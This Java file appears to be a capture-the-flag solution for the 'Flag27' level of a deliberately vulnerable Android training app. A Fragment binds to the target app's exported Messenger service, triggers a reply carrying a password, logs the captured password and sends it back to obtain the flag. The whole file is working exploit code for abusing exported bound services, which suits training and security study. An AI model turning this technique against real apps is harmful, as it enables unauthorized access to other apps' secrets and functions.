package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.*;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag27Fragment extends Fragment {

    private Messenger serviceMessenger = null;
    private boolean bound = false;

    // 2.2 Reply handler to receive password from the service
    private final Messenger replyMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(@NonNull Message msg) {
            Log.i("Flag27Fragment", "Received reply from service: what=" + msg.what);
            Bundle data = msg.getData();
            if (data != null && data.containsKey("password")) {
                String capturedPassword = data.getString("password");
                Log.i("Flag27Fragment", "Captured password: " + capturedPassword);

                // 3. Send third message with captured password
                sendMessageToService(3, "password", capturedPassword);
            }
        }
    });

    private final ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            bound = true;

            // 1. Send normal message with what = 1
            sendMessageToService(1, "echo", "give flag");

            // 2.1 Send message with what = 2 and replyTo set
            sendMessageToService(2, "dummy", "dummy");
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
            bound = false;
        }
    };

    private void sendMessageToService(int what, String key, String value) {
        if (!bound || serviceMessenger == null || value == null) return;

        Message msg = Message.obtain(null, what);

        Bundle bundle = new Bundle();
        bundle.putString(key, value);
        msg.setData(bundle);

        msg.replyTo = replyMessenger;
        // to make msg.obj != null
        msg.obj = new Bundle();

        try {
            serviceMessenger.send(msg);
            Log.i("Flag27Fragment", "Sent message with what=" + what + ", key=" + key + ", value=" + value);
        } catch (RemoteException e) {
            Log.e("Flag27Fragment", "Failed to send message with what=" + what, e);
        }
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag27, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag27);

        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service"));
            requireContext().bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
        });

        return view;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (bound) {
            requireContext().unbindService(serviceConnection);
            bound = false;
        }
    }
}